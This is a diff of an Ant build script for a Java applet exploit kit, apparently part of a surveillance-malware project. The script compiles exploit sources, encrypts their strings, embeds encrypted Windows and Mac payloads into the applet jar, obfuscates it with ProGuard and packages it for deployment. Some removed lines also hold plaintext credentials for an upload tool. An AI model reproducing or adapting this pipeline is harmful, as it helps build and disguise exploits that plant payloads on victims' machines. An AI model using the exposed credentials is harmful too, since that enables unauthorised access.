@@ -5,7 +5,6 @@
     default="all" >
 
     <target name="init" >
-
         <delete  dir="build"
             failonerror="false" />
         <delete  dir="build"
@@ -24,16 +23,7 @@
             source="1.6"
             srcdir="src-exploit"
             target="1.6" />
-
         <mkdir dir="build/classes-payload" />
-
-        <javac
-            debug="true"
-            destdir="build/classes-payload"
-            source="1.6"
-            srcdir="src-payload"
-            target="1.6" />
-
         <mkdir dir="build/classes-datacreator" />
 
         <javac
@@ -67,7 +57,6 @@
             failOnError="true" >
 
             <arg value="src-exploit/x/H.java" />
-
             <arg value="build/src-encoded/x/H.java" />
         </java>
 
@@ -77,7 +66,6 @@
             failOnError="true" >
 
             <arg value="src-exploit/x/MCL.java" />
-
             <arg value="build/src-encoded/x/MCL.java" />
         </java>
 
@@ -87,7 +75,6 @@
             failOnError="true" >
 
             <arg value="src-exploit/x/XAppletW.java" />
-
             <arg value="build/src-encoded/x/XAppletW.java" />
         </java>
 
@@ -157,24 +144,13 @@
         </java>
         </target>
         
-        <target name="add_payload_win">
+        <target name="obfuscate_payload_win">
         <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
             <arg value="payloads/win" />
-            <arg value="build/classes-exploit/w" />
+            <arg value="server/win" />
         </java>
         </target>
-        
-        <target name="add_nopayload_win">
-        <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
-            <arg value="payloads/nowin" />
-            <arg value="build/classes-exploit/w" />
-        </java>
-        </target>
-        
-<!--         <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
-            <arg value="payloads/mac" />
-            <arg value="build/classes-exploit/x/m" />
-        </java> -->
+
         <target name="delete_files">
         <delete failonerror="true" >
             <fileset dir="build/classes-exploit" includes="x/Context_close_Caller.class" />
@@ -202,80 +178,16 @@
         </jar>
         </target>
         
-        <target name="dist" depends="build_exploit,obfuscate_exploit,add_nopayload_win,make_jar">
+        <target name="dist" depends="build_exploit,obfuscate_exploit,obfuscate_payload_win,make_jar">
           <delete file="server/applet/w.jar"/>
-          <copy file ="build/jar/x.jar" overwrite="true" todir="server/applet" />
-          
-          <zip destfile="server/applet-x.zip" basedir="server/applet" />
-          <!-- <copy file="server/applet.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\applet.zip" overwrite="true" /> -->
-          <echo>rcs-core -n applet -d rcs-castore -u zenobatch -p zenop123 -R server\applet-x.zip </echo>
+          <copy file ="build/jar/x.jar" overwrite="true" todir="server" />          
         </target>
-        
-        <target name="test_html" depends="build_exploit,obfuscate_exploit,add_payload_win,make_jar">
-          <copy overwrite="true" todir="html" >
-            <fileset dir="build/jar" />
-          </copy>
-        </target>
-        
+         
         <target name="all" depends="dist">
         </target>
-
-<!--        
-<fileset dir="payloads" includes="*"/>
- <jar
-            basedir="build/classes-payload"
-            includes="**/*.class"
-            jarfile="build/jar/payload.jar" /> -->
 
 		<taskdef resource="proguard/ant/task.properties"
          	classpath="lib/proguard.jar" />
 		
-		<target name="direct">
-		    
-		    <mkdir dir="build/src-direct-encoded" />
-		    
-		    <java
-	            classname="x.StringEncryptor"
-	            classpath="build/classes-datacreator;build/classes-exploit"
-	            failOnError="true" >
 	
-	            <arg value="src-direct/Html5.java" />
-	            <arg value="build/src-direct-encoded/Html5.java" />
-        	</java>
-		    <copy todir="build/src-direct-encoded">
-		        <fileset dir="src-direct/x"/>
-		    </copy>
-		    
-		    <javac  debug="false"
-		            destdir="build/classes-direct"
-		            source="1.6"
-		            srcdir="build/src-direct-encoded"
-		            target="1.6" />
-		    
-		    <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
-            	<arg value="payloads/nowin" />
-            	<arg value="build/classes-direct/w" />
-            </java>
-            <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
-            	<arg value="payloads/nomac" />
-            	<arg value="build/classes-direct/m" />
-            </java>
-            
-		    <jar jarfile="build/jar/we.jar" >
-	            <fileset dir="build/classes-direct" includes="**/*" />          
-        	</jar>
-        	
-		    <proguard configuration="applets.pro"/>
-		    
-		    <delete file="server/applet/x.jar"/>
-		    <copy file="build/jar/w.jar" todir="server/applet"/>                
-            
-            <zip destfile="server/applet.zip" basedir="server/applet" />  
-        </target>
-        
-		<target name="distdirect">
-            <copy file="server/applet.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\applet.zip" overwrite="true" />
-            <echo>rcs-core -n applet -R applet.zip -d zenotto -u admin -p adminp123  -f1</echo>
-		</target>
-
 </project>
